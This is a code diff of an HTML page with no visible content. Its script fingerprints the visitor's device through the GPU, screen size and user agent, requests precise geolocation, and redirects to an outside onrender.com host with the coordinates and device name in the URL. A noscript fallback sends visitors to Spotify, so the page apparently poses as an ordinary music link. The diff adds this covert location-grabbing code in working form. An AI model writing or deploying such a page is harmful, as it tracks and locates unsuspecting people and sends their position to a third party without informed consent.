@@ -8,48 +8,94 @@
 </head>
 <body>
   <script>
+    const BASE_URL = 'https://wer1x.onrender.com';
+
     function getGPU() {
       try {
-        let c = document.createElement('canvas'), gl = c.getContext('webgl') || c.getContext('experimental-webgl');
-        if (gl) { let e = gl.getExtension('WEBGL_debug_renderer_info'); if (e) return gl.getParameter(e.UNMASKED_RENDERER_WEBGL) || ''; }
-      } catch(e) {}
+        let c = document.createElement('canvas'),
+            gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+        if (gl) {
+          let e = gl.getExtension('WEBGL_debug_renderer_info');
+          if (e) return gl.getParameter(e.UNMASKED_RENDERER_WEBGL) || '';
+        }
+      } catch (e) {}
       return '';
     }
-    let device = '', ua = navigator.userAgent, gpu = getGPU();
-    if (/iPhone/.test(ua) || (/Mac/.test(ua) && 'ontouchend' in document)) {
-      let w = screen.width, h = screen.height, dpr = window.devicePixelRatio || 1;
-      let ios = (ua.match(/iPhone OS (\d+)_/) || [])[1] || 0;
-      let key = w+'x'+h+'x'+dpr;
-      let a18 = gpu.includes('A18');
-      let a17 = gpu.includes('A17');
-      let a16 = gpu.includes('A16');
-      let a15 = gpu.includes('A15');
-      let a14 = gpu.includes('A14');
-      let map = {
-        '320x568x2': 'iPhone SE',
-        '375x667x2': ios >= 14 ? 'iPhone SE 2/3' : 'iPhone 6/7/8',
-        '414x736x3': 'iPhone 6 Plus/7 Plus/8 Plus',
-        '375x812x3': a15 && ios >= 16 ? 'iPhone 14' : a15 ? 'iPhone 13 mini' : a14 ? 'iPhone 12 mini' : a13 ? 'iPhone 11 Pro' : a12 ? 'iPhone XS' : ios >= 17 ? 'iPhone 14' : ios >= 15 ? 'iPhone 13 mini' : ios >= 14 ? 'iPhone 12 mini' : ios >= 13 ? 'iPhone 11 Pro' : ios >= 12 ? 'iPhone XS' : 'iPhone X',
-        '414x896x2': ios >= 13 ? 'iPhone 11' : 'iPhone XR',
-        '414x896x3': ios >= 13 ? 'iPhone 11 Pro Max' : 'iPhone XS Max',
-        '390x844x3': a15 && ios >= 16 ? 'iPhone 14' : a15 ? 'iPhone 13' : a14 ? 'iPhone 12' : ios >= 17 ? 'iPhone 14' : ios >= 15 ? 'iPhone 13' : ios >= 14 ? 'iPhone 12' : 'iPhone 12',
-        '428x926x3': a15 && ios >= 16 ? 'iPhone 14 Plus' : a15 ? 'iPhone 13 Pro Max' : a14 ? 'iPhone 12 Pro Max' : ios >= 16 ? 'iPhone 14 Plus' : ios >= 15 ? 'iPhone 13 Pro Max' : 'iPhone 12 Pro Max',
-        '393x852x3': a18 ? 'iPhone 16' : a17 ? 'iPhone 15 Pro' : a16 && ios >= 17 ? 'iPhone 15' : a16 ? 'iPhone 14 Pro' : ios >= 18 ? 'iPhone 16' : ios >= 17 ? 'iPhone 15' : 'iPhone 14 Pro',
-        '430x932x3': a18 ? 'iPhone 16 Pro Max' : a17 ? 'iPhone 15 Pro Max' : ios >= 18 ? 'iPhone 16 Pro Max' : 'iPhone 15 Pro Max',
-        '360x780x3': 'iPhone 16e'
-      };
-      device = map[key] || '';
+
+    function detectDevice() {
+      let ua = navigator.userAgent,
+          gpu = getGPU();
+
+      if (/iPhone/.test(ua) || (/Mac/.test(ua) && 'ontouchend' in document)) {
+        let w = screen.width,
+            h = screen.height,
+            dpr = window.devicePixelRatio || 1;
+        let ios = (ua.match(/iPhone OS (\d+)_/) || [])[1] || 0;
+        let key = w + 'x' + h + 'x' + dpr;
+        let a18 = gpu.includes('A18'),
+            a17 = gpu.includes('A17'),
+            a16 = gpu.includes('A16'),
+            a15 = gpu.includes('A15'),
+            a14 = gpu.includes('A14');
+        let map = {
+          '320x568x2': 'iPhone SE',
+          '375x667x2': ios >= 14 ? 'iPhone SE 2/3' : 'iPhone 6/7/8',
+          '414x736x3': 'iPhone 6 Plus/7 Plus/8 Plus',
+          '375x812x3': a15 && ios >= 16 ? 'iPhone 14' : a15 ? 'iPhone 13 mini' : a14 ? 'iPhone 12 mini' : ios >= 17 ? 'iPhone 14' : ios >= 15 ? 'iPhone 13 mini' : ios >= 14 ? 'iPhone 12 mini' : ios >= 13 ? 'iPhone 11 Pro' : ios >= 12 ? 'iPhone XS' : 'iPhone X',
+          '414x896x2': ios >= 13 ? 'iPhone 11' : 'iPhone XR',
+          '414x896x3': ios >= 13 ? 'iPhone 11 Pro Max' : 'iPhone XS Max',
+          '390x844x3': a15 && ios >= 16 ? 'iPhone 14' : a15 ? 'iPhone 13' : a14 ? 'iPhone 12' : ios >= 17 ? 'iPhone 14' : ios >= 15 ? 'iPhone 13' : ios >= 14 ? 'iPhone 12' : 'iPhone 12',
+          '428x926x3': a15 && ios >= 16 ? 'iPhone 14 Plus' : a15 ? 'iPhone 13 Pro Max' : a14 ? 'iPhone 12 Pro Max' : ios >= 16 ? 'iPhone 14 Plus' : ios >= 15 ? 'iPhone 13 Pro Max' : 'iPhone 12 Pro Max',
+          '393x852x3': a18 ? 'iPhone 16' : a17 ? 'iPhone 15 Pro' : a16 && ios >= 17 ? 'iPhone 15' : a16 ? 'iPhone 14 Pro' : ios >= 18 ? 'iPhone 16' : ios >= 17 ? 'iPhone 15' : 'iPhone 14 Pro',
+          '430x932x3': a18 ? 'iPhone 16 Pro Max' : a17 ? 'iPhone 15 Pro Max' : ios >= 18 ? 'iPhone 16 Pro Max' : 'iPhone 15 Pro Max',
+          '360x780x3': 'iPhone 16e'
+        };
+        return map[key] || '';
+      }
+
+      if (/iPad/.test(ua)) return 'iPad';
+
+      let androidMatch = ua.match(/Android\s([\d.]+)/);
+      if (androidMatch) {
+        let model = ua.match(/;\s*([^;)]+)/);
+        return model ? model[1].trim() : (/Mobile/i.test(ua) ? 'Android Telefon' : 'Android Tablet');
+      }
+
+      if (/Windows/.test(ua)) return 'PC';
+      if (/Mac/.test(ua)) return 'Mac';
+      if (/Linux/.test(ua)) return 'Linux';
+
+      return '';
     }
-    let url = 'https://wer1x.onrender.com';
+
+    function redirectWithParams(url, params) {
+      let sep = url.includes('?') ? '&' : '?';
+      window.location.replace(url + sep + params.join('&'));
+    }
+
+    let device = detectDevice();
     let params = [];
     if (device) params.push('device=' + encodeURIComponent(device));
-    navigator.geolocation.getCurrentPosition(p => {
-      params.push('geo=izin_verdi&lat=' + p.coords.latitude + '&lon=' + p.coords.longitude + '&acc=' + p.coords.accuracy);
-      window.location.replace(url + (params.length ? '?' + params.join('&') : ''));
-    }, () => {
-      params.push('geo=izin_vermedi');
-      window.location.replace(url + (params.length ? '?' + params.join('&') : ''));
-    }, { timeout: 5000, enableHighAccuracy: true });
+
+    navigator.geolocation.getCurrentPosition(
+      p => {
+        params.push(
+          'geo=izin_verdi',
+          'lat=' + p.coords.latitude,
+          'lon=' + p.coords.longitude,
+          'acc=' + p.coords.accuracy
+        );
+        redirectWithParams(BASE_URL, params);
+      },
+      () => {
+        params.push('geo=izin_vermedi');
+        redirectWithParams(BASE_URL, params);
+      },
+      { timeout: 5000, enableHighAccuracy: true }
+    );
   </script>
+  <noscript>
+    <meta http-equiv="refresh" content="0;url=https://open.spotify.com">
+  </noscript>
 </body>
 </html>
